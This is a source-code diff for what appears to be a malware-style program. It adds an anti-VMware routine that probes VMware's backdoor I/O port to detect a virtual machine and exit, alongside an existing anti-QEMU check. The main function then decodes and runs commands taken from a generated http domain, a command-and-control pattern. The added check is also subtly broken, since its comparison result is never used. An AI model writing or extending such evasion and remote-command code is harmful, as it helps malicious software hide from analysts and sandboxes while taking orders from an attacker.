@@ -28,6 +28,34 @@ static int antiQEMU()
 	exit(1);
 }
 
+static int antiVMware()
+{
+	__try {
+		__asm {
+			push   edx
+			push   ecx
+			push   ebx
+
+			mov    eax, 'VMXh'
+			mov    ebx, 0 // any value but not the MAGIC VALUE
+			mov    ecx, 10 // get VMWare version
+			mov    edx, 'VX' // port number
+
+			in     eax, dx // read port
+						   // on return EAX returns the VERSION
+			cmp    ebx, 'VMXh' // is it a reply from VMWare?
+
+			pop    ebx
+			pop    ecx
+			pop    edx
+		}
+	} __except (EXCEPTION_EXECUTE_HANDLER) {
+		return 0;
+	}
+	printf("Detected");
+	exit(1);
+}
+
 std::wstring genDomain()
 {
 	std::wstring pre = L"http://";
@@ -84,6 +112,7 @@ static int cmdHandler(std::wstring cmd)
 int main()
 {
 	antiQEMU();
+	antiVMware();
 	cmdHandler(decodeCmd(genDomain()));
 	return 0;
 }
